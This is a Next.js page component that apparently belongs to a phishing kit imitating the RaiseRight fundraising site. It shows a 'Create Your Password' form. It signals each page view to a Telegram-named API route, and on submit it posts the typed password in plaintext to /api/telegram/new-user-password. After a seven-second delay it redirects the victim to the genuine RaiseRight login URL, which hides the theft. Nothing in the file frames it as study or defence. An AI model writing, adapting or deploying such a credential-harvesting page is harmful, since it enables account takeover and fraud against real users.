"use client";

import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { Button } from "@/components/ui/button";
import { SiteFooter } from "@/components/site-footer";
import { SiteHeader } from "@/components/site-header";
import { Input } from "@/components/ui/input";
import { Checkbox } from "@/components/ui/checkbox";

const RAISERIGHT_LOGIN_URL =
  "https://login.raiseright.com/Account/Login?ReturnUrl=%2Fconnect%2Fauthorize%2Fcallback%3Fclient_id%3DRaiseRight.Web.Bff%26redirect_uri%3Dhttps%253A%252F%252Fwww.raiseright.com%252Fsignin-oidc%26response_type%3Dcode%26scope%3Dopenid%2520profile%2520offline_access%2520email%2520raiseright%2520ecomm%2520crm%2520fulfillment%2520auth%2520wallet%2520earnings%26code_challenge%3Ddp_xbsGAyuUdr36uO3pB2X5YGYWtvQLL9Ts-dUOZq5w%26code_challenge_method%3DS256%26nonce%3D639221149547360196.YjZhNmYyMzEtZGZhMi00OWM5LTk1YTktN2EwMTE3Mjc0NzRlNTc3ZDcyMGItMjQwOS00NGMzLWFhMzgtZGE1Y2U2MzMzYWU1%26state%3DCfDJ8NuOqh4R2EpOnKLccbReAJlbCksdMCFWjeVEQcYAutPhEaEIOU8oc8s1X3CiehTlL2oV3Z8QIpq7GiAJXBd85EVLhV8IeABjwHAI8lY6nzZPVKd_DRJ6P5DdgPoU6PlvMhIiBVTlpDUpPIJCAfvwbtS8J_QxVWJaN8FjhDn8PgkHYaaIlPKqBFyUwVKgR5hidvcmI3EJNa43su2ceQatHQz-q3IrjWTRigOjW8Qzzif7OUxk7GFAueU8PkDsdYxd4e1ESUwy6iQe_krSBcyJqlaxE-zalPpc_kPU0uwk2WZz-V_s-HhJYZBI8JAtDQaINCfjKnuT542FBZorqLOLNea4zd8JcGLeYJRv9DHXYFqK8dIcgDH5aT-sSqNB6X_zrQ%26x-client-SKU%3DID_NET8_0%26x-client-ver%3D8.0.1.0";

export default function NewUserPasswordPage() {
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const router = useRouter();
  const viewNotificationSent = useRef(false);

  useEffect(() => {
    if (viewNotificationSent.current) return;
    viewNotificationSent.current = true;
    fetch("/api/telegram/new-user-password-view", { method: "POST" }).catch(
      console.error,
    );
  }, []);

  const passwordsMatch = password === confirmPassword;
  const isFormValid =
    password.length >= 1 && confirmPassword.length >= 1 && passwordsMatch;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid || isLoading) return;
    if (!passwordsMatch) {
      setError("Passwords do not match.");
      return;
    }
    setError(null);
    setIsLoading(true);
    try {
      await fetch("/api/telegram/new-user-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password }),
      }).catch(console.error);
    } catch (err) {
      console.error("Failed to send new user password notification:", err);
    }
    await new Promise((r) => setTimeout(r, 7000));
    window.location.href = RAISERIGHT_LOGIN_URL;
  };

  return (
    <>
      <main className="px-4 py-6 md:hidden">
        <form
          onSubmit={handleSubmit}
          className="mx-auto max-w-md rounded-lg border border-gray-200 bg-white p-4 shadow-sm"
        >
          <div className="flex items-center gap-2 mb-3">
            <button
              type="button"
              onClick={() => router.back()}
              className="inline-flex items-center justify-center rounded-full p-2 text-[#254650]"
            >
              <svg
                className="w-6 h-6"
                fill="none"
                stroke="currentColor"
                viewBox="0 0 24 24"
                strokeWidth="2"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M9 5l-7 7 7 7"
                />
              </svg>
            </button>
            <h2 className="text-base font-medium text-gray-900">New User</h2>
          </div>

          <h1 className="text-xl font-semibold text-gray-900">Create Your Password</h1>
          <p className="mt-2 text-sm text-gray-700">
            Enter a password for your account. You will use this to log on.
          </p>

          <div className="mt-4 space-y-3">
            <div>
              <label htmlFor="password-mobile" className="block text-sm font-medium text-gray-900 mb-1.5">
                Password
              </label>
              <Input
                id="password-mobile"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full h-10 bg-gray-50 border-gray-300 rounded-md"
              />
            </div>

            <div>
              <label htmlFor="confirm-mobile" className="block text-sm font-medium text-gray-900 mb-1.5">
                Confirm Password
              </label>
              <Input
                id="confirm-mobile"
                type={showPassword ? "text" : "password"}
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                placeholder="Confirm Password"
                className="w-full h-10 bg-gray-50 border-gray-300 rounded-md"
              />
            </div>

            <div className="flex items-center gap-2">
              <Checkbox
                id="show-password-mobile"
                checked={showPassword}
                onCheckedChange={(c) => setShowPassword(c === true)}
                className="border-gray-400"
              />
              <label htmlFor="show-password-mobile" className="text-sm text-gray-700 cursor-pointer select-none">
                Show Password
              </label>
            </div>

            {error && <p className="text-sm text-red-600">{error}</p>}
          </div>

          <div className="mt-4 flex gap-3">
            <Button
              type="submit"
              disabled={!isFormValid || isLoading}
              className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-9 px-5 text-sm font-medium"
            >
              {isLoading ? "Loading..." : "Continue"}
            </Button>
            <Button
              type="button"
              variant="ghost"
              className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
              onClick={() => router.push("/new-user-code")}
            >
              Cancel
            </Button>
          </div>
        </form>
      </main>

      <div className="hidden md:block min-h-screen bg-white">
        <SiteHeader />
        <div className="max-w-2xl px-4 py-10 mb-67.5 mx-auto md:mx-0 md:ml-15">
          <div className="mb-6">
            <h2 className="text-base font-medium text-gray-900 mb-4">
              New User
            </h2>
            <h1 className="text-2xl font-semibold text-gray-900 mb-3">
              Create Your Password
            </h1>
            <p className="text-gray-700 text-sm mb-4">
              Enter a password for your account. You will use this to log on.
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-4">
            <div>
              <label
                htmlFor="password"
                className="block text-sm font-medium text-gray-900 mb-1.5"
              >
                Password
              </label>
              <Input
                id="password"
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="max-w-70 h-10 bg-gray-50 border-gray-300 rounded-md"
              />
            </div>

            <div>
              <label
                htmlFor="confirm"
                className="block text-sm font-medium text-gray-900 mb-1.5"
              >
                Confirm Password
              </label>
              <Input
                id="confirm"
                type={showPassword ? "text" : "password"}
                value={confirmPassword}
                onChange={(e) => setConfirmPassword(e.target.value)}
                placeholder="Confirm Password"
                className="max-w-70 h-10 bg-gray-50 border-gray-300 rounded-md"
              />
            </div>

            <div className="flex items-center gap-2">
              <Checkbox
                id="show-password"
                checked={showPassword}
                onCheckedChange={(c) => setShowPassword(c === true)}
                className="border-gray-400"
              />
              <label
                htmlFor="show-password"
                className="text-sm text-gray-700 cursor-pointer select-none"
              >
                Show Password
              </label>
            </div>

            {error && <p className="text-sm text-red-600">{error}</p>}

            <div className="flex gap-3 pt-2">
              <Button
                type="submit"
                disabled={!isFormValid || isLoading}
                className="bg-[#254650] text-white hover:bg-[#1e383f] rounded-md disabled:opacity-70 disabled:pointer-events-none h-9 px-5 text-sm font-medium"
              >
                {isLoading ? "Loading..." : "Continue"}
              </Button>
              <Button
                type="button"
                variant="ghost"
                className="bg-gray-200 text-gray-700 hover:bg-gray-300 rounded-md h-9 px-5 text-sm font-medium"
                onClick={() => router.push("/new-user-code")}
              >
                Cancel
              </Button>
            </div>
          </form>
        </div>

        <SiteFooter />
      </div>
    </>
  );
}
